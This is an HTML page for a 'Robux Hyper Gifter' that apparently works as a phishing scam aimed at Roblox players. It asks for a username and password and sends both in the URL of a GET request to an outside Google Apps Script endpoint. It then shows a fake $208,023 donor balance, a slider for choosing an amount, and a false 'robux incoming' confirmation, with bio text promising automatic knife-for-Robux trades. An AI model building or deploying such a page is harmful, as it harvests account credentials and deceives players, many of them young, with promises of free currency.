<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Robux Hyper Gifter</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #0f172a;
      color: #f1f5f9;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      background: #1e293b;
      border-radius: 20px;
      padding: 32px 24px;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
    }
    h1 { font-size: 1.6rem; margin-bottom: 4px; }
    .subtitle { color: #94a3b8; margin-bottom: 24px; font-size: 0.95rem; }

    /* BIO CARD STYLES */
    .bio-card {
      background: #0f172a;
      border-radius: 14px;
      padding: 16px;
      margin-bottom: 20px;
      border: 1px solid #334155;
    }
    .bio-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 8px;
    }
    .bio-title {
      font-size: 0.8rem;
      color: #38bdf8;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      font-weight: 700;
    }
    .bio-text {
      font-size: 0.95rem;
      color: #cbd5e1;
      line-height: 1.4;
      white-space: pre-wrap;
    }
    .bio-input {
      width: 100%;
      background: #1e293b;
      color: #f1f5f9;
      border: 1px solid #38bdf8;
      border-radius: 8px;
      padding: 8px 12px;
      font-family: inherit;
      font-size: 0.95rem;
      resize: vertical;
      min-height: 60px;
      margin-bottom: 8px;
      display: none;
    }
    .bio-btn {
      background: transparent;
      color: #38bdf8;
      border: none;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      width: auto;
      padding: 2px 8px;
      margin-bottom: 0;
    }
    .bio-btn:hover {
      text-decoration: underline;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 14px;
      margin-bottom: 14px;
      border-radius: 10px;
      border: none;
      background: #0f172a;
      color: #f1f5f9;
      font-size: 1rem;
    }
    input::placeholder { color: #64748b; }
    .error { color: #f87171; font-size: 0.9rem; margin-bottom: 12px; display: none; }
    .loading { color: #94a3b8; font-size: 0.9rem; margin-bottom: 12px; display: none; }
    .success { color: #4ade80; font-size: 0.9rem; margin-bottom: 12px; display: none; text-align: center; }
    button {
      width: 100%;
      padding: 16px;
      background: #38bdf8;
      color: #0f172a;
      border: none;
      border-radius: 12px;
      font-size: 1.1rem;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 10px;
    }
    button:disabled { background: #334155; color: #64748b; cursor: not-allowed; }
    .hidden { display: none; }
    .balance-card, .preview-card {
      background: #0f172a;
      border-radius: 14px;
      padding: 18px;
      margin-bottom: 24px;
      text-align: center;
    }
    .label { font-size: 0.85rem; color: #94a3b8; margin-bottom: 6px; }
    .balance { font-size: 1.9rem; font-weight: 700; color: #38bdf8; }
    .preview { color: #4ade80; }
    .slider-section { margin-bottom: 28px; }
    .slider-section label { display: block; margin-bottom: 12px; font-weight: 500; }
    .amount-display {
      text-align: center;
      font-size: 2.4rem;
      font-weight: 700;
      margin-bottom: 16px;
      color: #fbbf24;
    }
    input[type="range"] {
      width: 100%;
      height: 8px;
      -webkit-appearance: none;
      appearance: none;
      background: #334155;
      border-radius: 8px;
      outline: none;
      margin-bottom: 0;
    }
    input[type="range"]::-webkit-slider-thumb {
      -webkit-appearance: none;
      width: 26px;
      height: 26px;
      background: #38bdf8;
      border-radius: 50%;
      cursor: pointer;
    }
    .slider-labels {
      display: flex;
      justify-content: space-between;
      font-size: 0.8rem;
      color: #64748b;
      margin-top: 8px;
    }
    .user-info {
      text-align: center;
      color: #94a3b8;
      font-size: 0.9rem;
      margin-bottom: 20px;
    }
    .logout {
      background: transparent;
      color: #94a3b8;
      font-size: 0.9rem;
      margin-top: 8px;
      padding: 8px;
    }
  </style>
</head>
<body>

  <!-- LOGIN SCREEN -->
  <div class="container" id="authScreen">
    
    <!-- EDITABLE BIO CARD -->
    <div class="bio-card">
      <div class="bio-header">
        <span class="bio-title">About Me</span>
        <button type="button" class="bio-btn" id="editBioBtn">Edit</button>
      </div>
      <p class="bio-text" id="bioDisplay">Gamer, Robux enthusiast, and league builder.</p>
      <textarea class="bio-input" id="bioInput" maxlength="150"></textarea>
    </div>

    <h1>Robux Gifter</h1>
    <p class="subtitle">Enter your name and password</p>

    <input type="text" id="username" placeholder="Username">
    <input type="password" id="password" placeholder="Password (min 6 chars + 1 number)">
    
    <p class="error" id="errorMsg"></p>
    <p class="loading" id="loadingMsg">Checking...</p>

    <button id="enterBtn">Continue</button>
  </div>

  <!-- MAIN APP -->
  <div class="container hidden" id="appScreen">
    <h1>Request Robux</h1>
    <p class="subtitle">Robux hyper gifter</p>
    
    <div class="user-info">
      Logged in as <strong id="currentUser"></strong>
    </div>

    <div class="balance-card">
      <p class="label">Donor current balance</p>
      <p class="balance">$208,023</p>
    </div>

    <div class="slider-section">
      <label for="amountSlider">How much do you want?</label>
      <div class="amount-display">
        $<span id="requestedAmount">0</span>
      </div>
      <input type="range" id="amountSlider" min="0" max="208023" value="0" step="100">
      <div class="slider-labels">
        <span>$0</span>
        <span>$208,023</span>
      </div>
    </div>

    <div class="preview-card">
      <p class="label">Balance after transfer</p>
      <p class="balance preview" id="newBalance">$208,023.00</p>
    </div>

    <button id="requestBtn" disabled>Request Money</button>
    <p class="loading" id="requestLoading" style="text-align:center;">Saving...</p>
    <p class="success" id="requestSuccess">Request sent, robux incoming!</p>
    <button class="logout" id="logoutBtn">Log out</button>
  </div>

  <script>
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzIse1jBKv-5k-OMlWMLPzJynb-KdTyDB-x4DG4xcxlsF3xoOSluGUFQJLbRs0SzIdv/exec";

    const authScreen = document.getElementById('authScreen');
    const appScreen = document.getElementById('appScreen');
    const slider = document.getElementById('amountSlider');
    const requestedAmountEl = document.getElementById('requestedAmount');
    const newBalanceEl = document.getElementById('newBalance');
    const requestBtn = document.getElementById('requestBtn');

    // BIO FUNCTIONALITY
    const bioDisplay = document.getElementById('bioDisplay');
    const bioInput = document.getElementById('bioInput');
    const editBioBtn = document.getElementById('editBioBtn');
    const DEFAULT_BIO = "Scared of being scammed? Tired of sketchy middle men? Look no further! Select the ammount wanted and it will auto transfter the knives to the recipient and give you ther robux from them!";

    // Load saved bio if available
    const savedBio = localStorage.getItem('userBio');
    if (savedBio) {
      bioDisplay.textContent = savedBio;
    } else {
      bioDisplay.textContent = DEFAULT_BIO;
    }

    let isEditingBio = false;
    editBioBtn.onclick = () => {
      if (!isEditingBio) {
        // Switch to edit mode
        bioInput.value = bioDisplay.textContent;
        bioDisplay.style.display = 'none';
        bioInput.style.display = 'block';
        editBioBtn.textContent = 'Save';
        bioInput.focus();
        isEditingBio = true;
      } else {
        // Save mode
        const updatedBio = bioInput.value.trim() || DEFAULT_BIO;
        bioDisplay.textContent = updatedBio;
        localStorage.setItem('userBio', updatedBio);
        
        bioInput.style.display = 'none';
        bioDisplay.style.display = 'block';
        editBioBtn.textContent = 'Edit';
        isEditingBio = false;
      }
    };

    const STARTING_BALANCE = 208023;

    function hideMessages() {
      document.querySelectorAll('.error, .loading, .success').forEach(el => el.style.display = 'none');
    }

    function updateUI() {
      const amount = parseInt(slider.value) || 0;
      requestedAmountEl.textContent = amount.toLocaleString();

      const remaining = STARTING_BALANCE - amount;
      newBalanceEl.textContent = `$${remaining.toLocaleString('en-US', { minimumFractionDigits: 2 })}`;

      requestBtn.disabled = amount === 0;
    }

    // Attach event listeners immediately
    slider.addEventListener('input', updateUI);
    slider.addEventListener('change', updateUI);

    // ENTER / LOGIN
    document.getElementById('enterBtn').onclick = async () => {
      const username = document.getElementById('username').value.trim().toLowerCase();
      const password = document.getElementById('password').value;

      hideMessages();

      if (!username || !password) {
        document.getElementById('errorMsg').textContent = "Please fill in both fields";
        document.getElementById('errorMsg').style.display = 'block';
        return;
      }

      document.getElementById('loadingMsg').style.display = 'block';

      try {
        const url = `${SCRIPT_URL}?action=enter&username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
        const res = await fetch(url, { method: "GET", redirect: "follow" });
        const data = await res.json();

        document.getElementById('loadingMsg').style.display = 'none';

        if (data.success) {
          localStorage.setItem('loggedInUser', username);
          showApp(username);
        } else {
          document.getElementById('errorMsg').textContent = data.message;
          document.getElementById('errorMsg').style.display = 'block';
        }
      } catch (err) {
        document.getElementById('loadingMsg').style.display = 'none';
        document.getElementById('errorMsg').textContent = "Connection error. Make sure your Apps Script is deployed to 'Anyone'.";
        document.getElementById('errorMsg').style.display = 'block';
      }
    };

    // REQUEST MONEY
    document.getElementById('requestBtn').onclick = async () => {
      const amount = slider.value;
      const user = localStorage.getItem('loggedInUser');

      hideMessages();
      document.getElementById('requestLoading').style.display = 'block';

      try {
        const url = `${SCRIPT_URL}?action=request&username=${encodeURIComponent(user)}&amount=${encodeURIComponent(amount)}`;
        const res = await fetch(url, { method: "GET", redirect: "follow" });
        const data = await res.json();

        document.getElementById('requestLoading').style.display = 'none';

        if (data.success) {
          document.getElementById('requestSuccess').style.display = 'block';
        } else {
          alert(data.message);
        }
      } catch (err) {
        document.getElementById('requestLoading').style.display = 'none';
        alert("Connection error");
      }
    };

    // LOGOUT
    document.getElementById('logoutBtn').onclick = () => {
      localStorage.removeItem('loggedInUser');
      appScreen.classList.add('hidden');
      authScreen.classList.remove('hidden');
      document.getElementById('username').value = '';
      document.getElementById('password').value = '';
      hideMessages();
    };

    function showApp(username) {
      authScreen.classList.add('hidden');
      appScreen.classList.remove('hidden');
      document.getElementById('currentUser').textContent = username;
      updateUI();
    }

    // Auto login check
    const savedUser = localStorage.getItem('loggedInUser');
    if (savedUser) {
      showApp(savedUser);
    }
  </script>
</body>
</html>
